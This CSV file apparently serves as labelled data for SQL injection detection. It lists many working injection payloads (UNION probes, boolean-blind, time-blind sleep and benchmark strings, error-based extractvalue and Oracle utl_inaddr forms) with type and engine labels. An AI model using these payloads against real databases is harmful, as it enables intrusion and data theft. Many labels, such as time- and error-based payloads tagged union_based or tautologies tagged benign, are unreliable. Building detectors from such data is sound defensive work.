id,payload_inner,sqli_type,db_engine,confidence,reasoning,sources_agree
23041,"-4121%"" ) union all select 2659,2659,2659,2659,2659,2659,2659,2659--",union_based,generic,0.7,UNION-based payload detected. Payload length: 68 chars.,2
23043,"1 ) union all select null,null#",union_based,generic,0.7,UNION-based payload detected. Payload length: 31 chars.,2
23044,"-5957 ) ) ) union all select 8485,8485,8485,8485,8485,8485,8485,8485,8485--",union_based,generic,0.7,UNION-based payload detected. Payload length: 75 chars.,2
23054,"-1434' ) ) union all select 4734,4734,4734,4734,4734,4734,4734,4734,4734,4734#",union_based,generic,0.7,UNION-based payload detected. Payload length: 78 chars.,2
23058,"-1197"" ) ) as dfsy where 8857 = 8857 or 3038 = 3038",boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 51 chars.,2
23060,"1"" ) ) ) union all select null#",union_based,generic,0.7,UNION-based payload detected. Payload length: 31 chars.,2
23065,"-7887' ) union all select 9049,9049,9049,9049,9049,9049,9049,9049,9049,9049#",union_based,generic,0.7,UNION-based payload detected. Payload length: 76 chars.,2
23066,"-8309'|| ( select 'qecl' where 8449 = 8449 union all select 8449,8449,8449,8449,8449,8449,8449--",union_based,generic,0.7,UNION-based payload detected. Payload length: 96 chars.,2
23067,"-7111 union all select 2409,2409,2409,2409,2409,2409#",union_based,generic,0.7,UNION-based payload detected. Payload length: 53 chars.,2
23070,"-3035"" ) union all select 7912,7912,7912#",union_based,generic,0.7,UNION-based payload detected. Payload length: 41 chars.,2
23071,"-3321"" where 1603 = 1603 union all select 1603,1603,1603,1603#",union_based,generic,0.7,UNION-based payload detected. Payload length: 62 chars.,2
23072,"1' ) ) as xuab where 4369 = 4369 union all select null,null,null--",union_based,generic,0.7,UNION-based payload detected. Payload length: 66 chars.,2
23077,"-8073 ) ) ) union all select 4481,4481,4481,4481--",union_based,generic,0.7,UNION-based payload detected. Payload length: 50 chars.,2
23079,"-4319"" ) where 7534 = 7534 or 8246 = 3217",boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 41 chars.,2
23080,"-6431"" ) ) union all select 2358,2358,2358,2358,2358,2358,2358,2358,2358,2358#",union_based,generic,0.7,UNION-based payload detected. Payload length: 78 chars.,2
23081,1' ) ) as pdrg where 5960 = 5960 and 9198 = 9198--,boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 50 chars.,2
23083,"-1947 union all select 7780,7780,7780,7780,7780,7780,7780,7780#",union_based,generic,0.7,UNION-based payload detected. Payload length: 63 chars.,2
23084,"-3116"" ) ) ) union all select 4600,4600,4600,4600--",union_based,generic,0.7,UNION-based payload detected. Payload length: 51 chars.,2
23087,"-3953 ) as wjjk where 6433 = 6433 or make_set ( 9354 = 9354,7185 ) --",boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 69 chars.,2
23089,-7378' or 6872 = 6872 and 'bnmn' like 'bnmn,boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 43 chars.,2
23096,"-1447"" union all select 3013,3013,3013,3013,3013,3013,3013--",union_based,generic,0.7,UNION-based payload detected. Payload length: 60 chars.,2
23100,"1"" union all select null,null,null--",union_based,generic,0.7,UNION-based payload detected. Payload length: 36 chars.,2
23105,"1"" where 1765 = 1765 union all select null,null,null,null,null,null#",union_based,generic,0.7,UNION-based payload detected. Payload length: 68 chars.,2
23108,1 and 8398 = 1891-- naov,boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 24 chars.,2
23109,"1'+ ( select vupb where 9575 = 9575 union all select null,null,null,null,null,null,null,null,null,null--",union_based,generic,0.7,UNION-based payload detected. Payload length: 104 chars.,2
23124,"1' ) where 6988 = 6988 union all select null,null,null,null,null,null,null,null--",union_based,generic,0.7,UNION-based payload detected. Payload length: 81 chars.,2
23127,"1"" ) ) ) and 7533 = 7533 and ( ( ( ""alvd"" like ""alvd",boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 52 chars.,2
23129,-5039 union all select 2114#,union_based,generic,0.7,UNION-based payload detected. Payload length: 28 chars.,2
23136,-1879%' ) ) or 3038 = 3038,boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 26 chars.,2
23142,"1 ) ) ) union all select null,null,null#",union_based,generic,0.7,UNION-based payload detected. Payload length: 40 chars.,2
23144,"1 ) ) ) union all select null,null,null,null,null,null,null,null,null,null#",union_based,generic,0.7,UNION-based payload detected. Payload length: 75 chars.,2
23146,"1%' union all select null,null,null,null#",union_based,generic,0.7,UNION-based payload detected. Payload length: 41 chars.,2
23147,"-9098' union all select 3476,3476,3476,3476,3476,3476#",union_based,generic,0.7,UNION-based payload detected. Payload length: 54 chars.,2
23149,"-7083 union all select 7705,7705,7705,7705,7705#",union_based,generic,0.7,UNION-based payload detected. Payload length: 48 chars.,2
23150,1' ) and 2006 = 2006,boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 20 chars.,2
23157,-6412%' or 4065 = 5815 and '%' = ',boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 34 chars.,2
23158,"1%"" ) ) ) union all select null,null--",union_based,generic,0.7,UNION-based payload detected. Payload length: 38 chars.,2
23160,"1%"" ) ) union all select null,null,null,null,null,null,null,null,null,null#",union_based,generic,0.7,UNION-based payload detected. Payload length: 75 chars.,2
23161,"-7007 ) union all select 6704,6704--",union_based,generic,0.7,UNION-based payload detected. Payload length: 36 chars.,2
23165,-2715' ) ) or 6942 = 1636 and ( ( 'mqeq' = 'mqeq,boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 48 chars.,2
23166,"-3378%"" ) ) union all select 9357,9357,9357,9357,9357--",union_based,generic,0.7,UNION-based payload detected. Payload length: 55 chars.,2
23172,-9005 union all select 4410#,union_based,generic,0.7,UNION-based payload detected. Payload length: 28 chars.,2
23178,"1"" ) where 3084 = 3084 union all select null,null--",union_based,generic,0.7,UNION-based payload detected. Payload length: 51 chars.,2
23179,"-4993"" union all select 6959,6959,6959--",union_based,generic,0.7,UNION-based payload detected. Payload length: 40 chars.,2
23185,"1"" and 7533 = 7533 and ""dqjp"" = ""dqjp",boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 37 chars.,2
23188,1' ) as dqgr where 2427 = 2427 and ( 3020 = 3020 ) *6703--,boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 58 chars.,2
23101,1' in boolean mode ),benign,generic,0.5,. Payload length: 20 chars.,2
23184,( 8266 = 8266 ) *9900,benign,generic,0.5,. Payload length: 21 chars.,2
23000,"call regexp_substring ( repeat ( right ( char ( 3702 ) ,0 ) ,500000000 ) ,null ) and ( ( ( 'leps' like 'leps",boolean_blind,generic,1.0,"Signals: 'substring', 'substr', 'char'; Boolean-blind SQLi (OR/AND logic)",1
23009,"1"" ) rlike sleep ( 5 ) #",time_blind,mysql,1.0,"Signals: 'sleep', 'rlike'; Time-blind SQLi (sleep/delay function); DB: mysql",1
23013,"1"" ) or char ( 68 ) ||char ( 69 ) ||char ( 97 ) ||char ( 85 ) = regexp_substring ( repeat ( right ( char ( 5389 ) ,0 ) ,5000000000 ) ,null ) and ( ""xmrq"" = ""xmrq",boolean_blind,generic,1.0,"Signals: 'substring', 'substr', 'char'; Boolean-blind SQLi (OR/AND logic)",1
23014,"1%"" rlike sleep ( 5 ) #",time_blind,mysql,1.0,"Signals: 'sleep', 'rlike'; Time-blind SQLi (sleep/delay function); DB: mysql",1
23017,"1%' ) and char ( 107 ) ||char ( 121 ) ||char ( 97 ) ||char ( 80 ) = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) --",boolean_blind,generic,1.0,"Signals: 'substring', 'substr', 'char'; Boolean-blind SQLi (OR/AND logic)",1
23025,"1 and char ( 120 ) ||char ( 106 ) ||char ( 117 ) ||char ( 85 ) = regexp_substring ( repeat ( right ( char ( 9981 ) ,0 ) ,5000000000 ) ,null )",boolean_blind,generic,1.0,"Signals: 'substring', 'substr', 'char'; Boolean-blind SQLi (OR/AND logic)",1
23092,"1"" procedure analyse ( extractvalue ( 9255,concat ( 0x5c, ( benchmark ( 5000000,md5 ( 0x52515a50 ) ) ) ) ) ,1 ) and ""ikhr"" = ""ikhr",error_based,mysql,1.0,"Signals: 'extractvalue', 'benchmark', 'concat'; Error-based SQLi (extractvalue/updatexml); DB: mysql",1
23093,"1"" ) and char ( 120 ) ||char ( 106 ) ||char ( 117 ) ||char ( 85 ) = regexp_substring ( repeat ( right ( char ( 9981 ) ,0 ) ,5000000000 ) ,null ) and ( ""rphs"" = ""rphs",boolean_blind,generic,1.0,"Signals: 'substring', 'substr', 'char'; Boolean-blind SQLi (OR/AND logic)",1
23121,"1%"" ) ) ) procedure analyse ( extractvalue ( 9255,concat ( 0x5c, ( benchmark ( 5000000,md5 ( 0x52515a50 ) ) ) ) ) ,1 ) and ( ( ( ""%"" = """,error_based,mysql,1.0,"Signals: 'extractvalue', 'benchmark', 'concat'; Error-based SQLi (extractvalue/updatexml); DB: mysql",1
23122,"1%"" ) ) ) rlike sleep ( 5 ) #",time_blind,mysql,1.0,"Signals: 'sleep', 'rlike'; Time-blind SQLi (sleep/delay function); DB: mysql",1
23132,"1%' ) ) and 8148 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) --",time_blind,sqlite,1.0,"Signals: 'randomblob', 'hex'; Time-blind SQLi (sleep/delay function); DB: sqlite",1
23141,"1' ) as tuhc where 4018 = 4018 or char ( 117 ) ||char ( 111 ) ||char ( 105 ) ||char ( 100 ) = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) --",boolean_blind,generic,1.0,"Signals: 'substring', 'substr', 'char'; Boolean-blind SQLi (OR/AND logic)",1
23177,"call regexp_substring ( repeat ( right ( char ( 3702 ) ,0 ) ,500000000 ) ,null ) #",benign,generic,1.0,"Signals: 'substring', 'substr', 'char'. Payload length: 82 chars.",1
23189,"1"" where 4445 = 4445 procedure analyse ( extractvalue ( 9255,concat ( 0x5c, ( benchmark ( 5000000,md5 ( 0x52515a50 ) ) ) ) ) ,1 ) --",error_based,mysql,1.0,"Signals: 'extractvalue', 'benchmark', 'concat'; Error-based SQLi (extractvalue/updatexml); DB: mysql",1
23033,-9509' ) where 9303 = 9303 order by 1#,benign,mysql,0.9,Signals: 'ord'; DB: mysql. Payload length: 38 chars.,1
23039,"-2745' ) or elt ( 1032 = 1032,3623 ) and ( 'vfxq' = 'vfxq",boolean_blind,mysql,0.9,Signals: 'elt'; Boolean-blind SQLi (OR/AND logic); DB: mysql,1
23075,"1' ) ) ) and 3824 = benchmark ( 5000000,md5 ( 0x76555642 ) ) and ( ( ( 'subq' like 'subq",time_blind,mysql,0.9,Signals: 'benchmark'; Time-blind SQLi (sleep/delay function); DB: mysql,1
23117,"-5507' or elt ( 1032 = 1032,3623 ) and 'ndqw' = 'ndqw",boolean_blind,mysql,0.9,Signals: 'elt'; Boolean-blind SQLi (OR/AND logic); DB: mysql,1
23139,"1"" ) as dezr where 2145 = 2145 or sleep ( 5 ) #",time_blind,mysql,0.9,Signals: 'sleep'; Time-blind SQLi (sleep/delay function); DB: mysql,1
23145,"1 ) and elt ( 4249 = 4249,7259 )",boolean_blind,mysql,0.9,Signals: 'elt'; Boolean-blind SQLi (OR/AND logic); DB: mysql,1
23174,1' or sleep ( 5 ) and 'udqz' = 'udqz,time_blind,mysql,0.9,Signals: 'sleep'; Time-blind SQLi (sleep/delay function); DB: mysql,1
23183,1' ) ) and sleep ( 5 ) #,time_blind,mysql,0.9,Signals: 'sleep'; Time-blind SQLi (sleep/delay function); DB: mysql,1
23042,end and '%' = ',boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 15 chars.,1
23094,"-2568"" ) or ( 8459 = 8459 ) *4906 and ( ""exyw"" = ""exyw",boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 54 chars.,1
23114,"1"" ) and make_set ( 8403 = 8403,8899 ) and ( ""akha"" like ""akha",boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 62 chars.,1
23173,"-7324 ) or make_set ( 8486 = 6544,6544 )",boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 40 chars.,1
23180,"end and ( ( ""dmgj"" = ""dmgj",boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 26 chars.,1
23190,"1%"" ) ) and make_set ( 8403 = 8403,8899 ) and ( ( ""%"" = """,boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 57 chars.,1
23008,"1"" where 5062 = 5062",benign,generic,0.5,. Payload length: 20 chars.,1
23035,1 ) as zodp where 9112 = 9112,benign,generic,0.5,. Payload length: 29 chars.,1
23068,1' ) where 6092 = 6092,benign,generic,0.5,. Payload length: 22 chars.,1
23086,1 where 6304 = 6304,benign,generic,0.5,. Payload length: 19 chars.,1
23088,1' ) where 1115 = 1115,benign,generic,0.5,. Payload length: 22 chars.,1
23090,1 ) ) as ndrh where 6308 = 6308,benign,generic,0.5,. Payload length: 31 chars.,1
23111,1' ) as zdhq where 5586 = 5586,benign,generic,0.5,. Payload length: 30 chars.,1
23112,1 where 7254 = 7254,benign,generic,0.5,. Payload length: 19 chars.,1
23116,1' where 7176 = 7176,benign,generic,0.5,. Payload length: 20 chars.,1
23162,1' ) ) as uizu where 1774 = 1774,benign,generic,0.5,. Payload length: 32 chars.,1
23171,1 where 2301 = 2301,benign,generic,0.5,. Payload length: 19 chars.,1
23182,1 ) where 8813 = 8813,benign,generic,0.5,. Payload length: 21 chars.,1
23002,1' and 2853 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 2853 = 2853 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) and 'toxr' like 'toxr,union_based,generic,1.0,"Signals: 'chr', 'cast', 'case'; UNION-based payload detected",0
23004,"1%"" ) ) ) or ( select 2* ( if ( ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 8113 = 8113,1 ) ) ) ,0x717a767a71,0x78 ) ) s ) , 8446744073709551610, 8446744073709551610 ) ) ) and ( ( ( ""%"" = """,union_based,mysql,1.0,"Signals: 'elt', 'concat', 'if'; UNION-based payload detected; DB: mysql",0
23006,"1' ) where 4778 = 4778 and elt ( 3114 = 3114,sleep ( 5 ) ) #",time_blind,mysql,1.0,"Signals: 'elt', 'sleep'; Time-blind SQLi (sleep/delay function); DB: mysql",0
23012,1 ) as jmib where 8130 = 8130 rlike ( select ( case when ( 7885 = 3932 ) then 1 else 0x28 end ) ) --,union_based,mysql,1.0,"Signals: 'rlike', 'case'; UNION-based payload detected; DB: mysql",0
23018,"1%"" ) ) and 6969 = ( select 6969 from pg_sleep ( 5 ) ) and ( ( ""%"" = """,union_based,postgresql,1.0,"Signals: 'pg_sleep', 'sleep'; UNION-based payload detected; DB: postgresql",0
23020,"-4480' ) where 4661 = 4661 or 1570 = convert ( int, ( select char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 1570 = 1570 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) --",union_based,mssql,1.0,"Signals: 'convert', 'char', 'case'; UNION-based payload detected; DB: mssql",0
23022,"1"" ) ) ) and ( select 2* ( if ( ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 3484 = 3484,1 ) ) ) ,0x717a767a71,0x78 ) ) s ) , 8446744073709551610, 8446744073709551610 ) ) ) and ( ( ( ""jmjr"" like ""jmjr",union_based,mysql,1.0,"Signals: 'elt', 'concat', 'if'; UNION-based payload detected; DB: mysql",0
23023,1' and 2853 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 2853 = 2853 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) and 'omlt' = 'omlt,union_based,generic,1.0,"Signals: 'chr', 'cast', 'case'; UNION-based payload detected",0
23026,"1 and 4241 = convert ( int, ( select char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 4241 = 4241 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) )",union_based,mssql,1.0,"Signals: 'convert', 'char', 'case'; UNION-based payload detected; DB: mssql",0
23027,-5880' ) ) or 2724 in ( ( char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 2724 = 2724 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) and ( ( 'rwgl' = 'rwgl,union_based,mssql,1.0,"Signals: 'char', 'case'; UNION-based payload detected; DB: mssql",0
23028,"-6084' ) ) or 1570 = convert ( int, ( select char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 1570 = 1570 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) and ( ( 'dfcp' = 'dfcp",union_based,mssql,1.0,"Signals: 'convert', 'char', 'case'; UNION-based payload detected; DB: mssql",0
23031,"1' ) or exp ( ~ ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 6270 = 6270,1 ) ) ) ,0x717a767a71,0x78 ) ) x ) ) and ( 'efwq' like 'efwq",union_based,mysql,1.0,"Signals: 'elt', 'concat', 'exp'; UNION-based payload detected; DB: mysql",0
23036,"1"" ) ) as hzcq where 9250 = 9250 and 4386 = utl_inaddr.get_host_address ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4386 = 4386 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) --",union_based,oracle,1.0,"Signals: 'chr', 'case', 'utl_inaddr'; UNION-based payload detected; DB: oracle",0
23037,"1"" ) or exp ( ~ ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 6270 = 6270,1 ) ) ) ,0x717a767a71,0x78 ) ) x ) ) and ( ""ureu"" like ""ureu",union_based,mysql,1.0,"Signals: 'elt', 'concat', 'exp'; UNION-based payload detected; DB: mysql",0
23046,select ( case when ( 9030 = 6952 ) then 1 else 9030* ( select 9030 from master..sysdatabases ) end ) --,union_based,generic,1.0,"Signals: 'case', 'sysdatabases'; UNION-based payload detected",0
23048,"1'+ ( select 'ngdk' where 7264 = 7264 and 3202 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) ) +'",union_based,sqlite,1.0,"Signals: 'randomblob', 'hex'; UNION-based payload detected; DB: sqlite",0
23049,"1'|| ( select 'mgel' where 3591 = 3591 and 6055 = ctxsys.drithsx.sn ( 6055, ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 6055 = 6055 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) ) ||'",union_based,oracle,1.0,"Signals: 'chr', 'case', 'ctxsys'; UNION-based payload detected; DB: oracle",0
23051,"1' ) as jiic where 6158 = 6158 or ( select 2* ( if ( ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 8113 = 8113,1 ) ) ) ,0x717a767a71,0x78 ) ) s ) , 8446744073709551610, 8446744073709551610 ) ) ) --",union_based,mysql,1.0,"Signals: 'elt', 'concat', 'if'; UNION-based payload detected; DB: mysql",0
23062,"1' or exp ( ~ ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 6270 = 6270,1 ) ) ) ,0x717a767a71,0x78 ) ) x ) ) and 'zpyx' = 'zpyx",union_based,mysql,1.0,"Signals: 'elt', 'concat', 'exp'; UNION-based payload detected; DB: mysql",0
23064,"1"" ) as ltoa where 9159 = 9159 or exp ( ~ ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 6270 = 6270,1 ) ) ) ,0x717a767a71,0x78 ) ) x ) ) --",union_based,mysql,1.0,"Signals: 'elt', 'concat', 'exp'; UNION-based payload detected; DB: mysql",0
23069,"1' ) ) as lxjs where 6503 = 6503 procedure analyse ( extractvalue ( 5840,concat ( 0x5c,0x7171706a71, ( select ( case when ( 5840 = 5840 ) then 1 else 0 end ) ) ,0x717a767a71 ) ) ,1 ) --",union_based,generic,1.0,"Signals: 'extractvalue', 'concat', 'case'; UNION-based payload detected",0
23073,"1"" ) where 8878 = 8878 or ( select 9173 from ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 9173 = 9173,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from information_schema.character_sets group by x ) a ) --",union_based,mysql,1.0,"Signals: 'elt', 'concat', 'char'; UNION-based payload detected; DB: mysql",0
23074,"1%"" and 4386 = utl_inaddr.get_host_address ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4386 = 4386 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) and ""%"" = """,union_based,oracle,1.0,"Signals: 'chr', 'case', 'utl_inaddr'; UNION-based payload detected; DB: oracle",0
23076,1 ) ) and 6969 = ( select 6969 from pg_sleep ( 5 ) ) and ( ( 9288 = 9288,union_based,postgresql,1.0,"Signals: 'pg_sleep', 'sleep'; UNION-based payload detected; DB: postgresql",0
23078,"1"" ) ) as tkmd where 3415 = 3415 and ( select 2* ( if ( ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 3484 = 3484,1 ) ) ) ,0x717a767a71,0x78 ) ) s ) , 8446744073709551610, 8446744073709551610 ) ) ) --",union_based,mysql,1.0,"Signals: 'elt', 'concat', 'if'; UNION-based payload detected; DB: mysql",0
23085,"1 or exp ( ~ ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 6270 = 6270,1 ) ) ) ,0x717a767a71,0x78 ) ) x ) )",union_based,mysql,1.0,"Signals: 'elt', 'concat', 'exp'; UNION-based payload detected; DB: mysql",0
23091,1' ) and 3754 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 3754 = 3754 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) and ( 'ulkq' = 'ulkq,union_based,oracle,1.0,"Signals: 'xmltype', 'chr', 'case'; UNION-based payload detected; DB: oracle",0
23095,"1"" ) ) or extractvalue ( 1297,concat ( 0x5c,0x7171706a71, ( select ( elt ( 1297 = 1297,1 ) ) ) ,0x717a767a71 ) ) and ( ( ""pebw"" like ""pebw",union_based,mysql,1.0,"Signals: 'extractvalue', 'elt', 'concat'; UNION-based payload detected; DB: mysql",0
